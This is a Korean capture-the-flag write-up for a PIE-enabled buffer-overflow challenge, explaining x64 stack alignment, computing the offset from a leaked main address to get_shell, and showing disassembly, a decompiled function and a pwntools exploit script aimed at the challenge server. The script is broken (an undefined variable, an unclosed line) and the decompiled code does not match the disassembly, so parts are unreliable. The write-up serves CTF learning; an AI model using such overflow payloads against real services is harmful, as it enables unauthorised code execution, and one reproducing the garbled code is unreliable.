PIE
참고: https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/
-> 왜 ret주소를 한번더 줘서 실행시켜야하는가. 
원래 stack alignment가 함수를 call할때 잠시 깨졌다가 ret에서 다시 맞춰준다,
call: rep - 8 -> 일시적으로 stack alignment가 깨짐 -> ret: rep + 8 -> 일시적으로 stack alignment깨진걸 다시 맞춤

문제: 버퍼 오버플로우는 call이 아니라 ret을 조정해서 함수를 호출하는것이다. 그렇기 때문에 stack alignment깨진다.
해결: ret값을 한번더 pay로드에 주고 그 뒤에 목표 실행함수 주소를 넣기.
-------------------------------------------------------------------------------------------------------------------------

*문제 상황
메인 함수의 주소를 들어갈때마다 준다. 메인 주소는 정해져있지 않고 매번 원격접속할때마다 다르게 주는거 같습니다.

fgets이지만 받는 buf[8]임으로 버퍼오버플로우가 가능합니다
파일을 디버깅 했을때 
[0x00000000000011da] main
[0x0000000000001000] get_shell
이렇게 둘의 주소를 알수있었습니다. 서로의 주소는 알지못해도 main과 get_shell의 주소차가 1da인걸 알수있었습니다.

-------------------------------------------------------------------------------------------------------------------------
*문제풀이
펀툴을 이용해서 메인의 주소만 따로 받습니다. 그리고 문자열을 16진수 주소값으로 바꿔놓습니다.
그 주소에서  - 1da 를 진행해줍니다. 이는 get_shell의 주소값입니다.

payload를 보냅니다.
buf[8] 8비트 + sfp 8비트 + getshell의 주소

-------------------------------------------------------------------------------------------------------------------------
[0x00000000000011da] main
[0x0000000000001000] get_shell

Main 의 주소와 get_shell 의 주소차 
= 11da - 1000
= 1da
------------------------------------------------------------------------------------------------------------------------- 디스어셈블 결과
do_you_want_some_pie`main:
do_you_want_some_pie[0x11f0] <+0>:   pushq  %rbp
do_you_want_some_pie[0x11f1] <+1>:   movq   %rsp, %rbp
do_you_want_some_pie[0x11f4] <+4>:   subq   $0x10, %rsp
do_you_want_some_pie[0x11f8] <+8>:   callq  0x1179                    ; init
do_you_want_some_pie[0x11fd] <+13>:  leaq   0xe08(%rip), %rax
do_you_want_some_pie[0x1204] <+20>:  movq   %rax, %rdi
do_you_want_some_pie[0x1207] <+23>:  callq  0x1030                    ; symbol stub for: puts
do_you_want_some_pie[0x120c] <+28>:  leaq   -0x23(%rip), %rax         ; <+0>
do_you_want_some_pie[0x1213] <+35>:  movq   %rax, %rsi
do_you_want_some_pie[0x1216] <+38>:  leaq   0xe06(%rip), %rax
do_you_want_some_pie[0x121d] <+45>:  movq   %rax, %rdi
do_you_want_some_pie[0x1220] <+48>:  movl   $0x0, %eax
do_you_want_some_pie[0x1225] <+53>:  callq  0x1050                    ; symbol stub for: printf
do_you_want_some_pie[0x122a] <+58>:  leaq   0xe0e(%rip), %rax
do_you_want_some_pie[0x1231] <+65>:  movq   %rax, %rdi
do_you_want_some_pie[0x1234] <+68>:  callq  0x1030                    ; symbol stub for: puts
do_you_want_some_pie[0x1239] <+73>:  movq   0x2e10(%rip), %rdx        ; stdin@GLIBC_2.2.5
do_you_want_some_pie[0x1240] <+80>:  leaq   -0x8(%rbp), %rax
do_you_want_some_pie[0x1244] <+84>:  movl   $0x80, %esi
do_you_want_some_pie[0x1249] <+89>:  movq   %rax, %rdi
do_you_want_some_pie[0x124c] <+92>:  callq  0x1060                    ; symbol stub for: fgets
do_you_want_some_pie[0x1251] <+97>:  movl   $0x0, %eax
do_you_want_some_pie[0x1256] <+102>: leave  
do_you_want_some_pie[0x1257] <+103>: retq   
(lldb) image lookup -r -n .

main에서 retq의 주소차
1257 - 11f0 = 67
------------------------------------------------------------------------------------------------------------------------- 디컴파일 결과

int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf[32]; // [rsp+0h] [rbp-120h] BYREF
  char v5[8]; // [rsp+104h] [rbp-1Ch] BYREF
  int v6; // [rsp+10Ch] [rbp-14h]
  int v7; // [rsp+110h] [rbp-10h]
  int v8; // [rsp+114h] [rbp-Ch]
  int v9; // [rsp+118h] [rbp-8h]
  int fd; // [rsp+11Ch] [rbp-4h]

  fd = 0;
  memset(buf, 0, sizeof(buf));
  v9 = open("flag1.txt", 0, envp);
  v8 = open("flag2.txt", 0);
  v7 = open("flag3.txt", 0);
  v6 = open("flag4.txt", 0);
  init();
  puts("Can you catch the flag???");
  __isoc99_scanf("%s", v5);
  read(fd, buf, 0xFFuLL);
  puts((const char *)buf);
  return 0;

-------------------------------------------------------------------------------------------------------------------------
*코드

from pwn import *


r = remote("ctf.keeper.or.kr", 1008)
Diff1 = 0x1da
Diff2 = 0x67
str = "printed:"
line1 = r.recvline().decode()
print(line1)
line2 = r.recvline().decode()
print(line2)
parsed = line2.split(':')
adr = parsed[1].strip()
print(adr)
line3 = r.recvline().decode()
print(line3)

result_hex = int(adr, 16)
print(result_hex)
print(diff)
new_address = (result_hex - diff)
Ret_addrress = (

payload  = b"A" * 16 #버퍼크기(8) + SFP(8)의 크기만큰 덮어쓰기
payload += p64(0x40101a) # system retq의 주소를 한번 줘야함
payload += p64(new_address)
r.sendline(payload)
print(payload)
r.interactive()

